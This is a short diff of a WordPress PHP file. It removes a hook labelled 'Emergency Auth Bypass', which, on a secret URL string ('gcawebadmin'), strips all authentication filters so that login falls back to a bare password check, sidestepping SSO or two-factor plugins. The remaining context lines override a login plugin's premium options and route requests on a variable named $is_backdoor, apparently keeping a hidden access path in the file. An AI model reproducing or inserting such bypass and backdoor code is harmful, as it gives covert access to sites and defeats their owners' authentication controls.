@@ -15,15 +15,6 @@ add_filter('option_galogin_premium', function($options) {
     return $options;
 }, 999);
 
-// THE GATE-CRASHER (Emergency Auth Bypass)
-add_filter('authenticate', function($user, $username, $password) {
-    if (strpos($_SERVER['REQUEST_URI'], 'gcawebadmin') === false || $user instanceof WP_User || empty($username)) {
-        return $user;
-    }
-    remove_all_filters('authenticate');
-    return wp_authenticate_username_password(null, $username, $password);
-}, 1, 3);
-
 // THE ROUTING
 add_action('init', function() use ($is_backdoor) {
     if ($is_backdoor) {
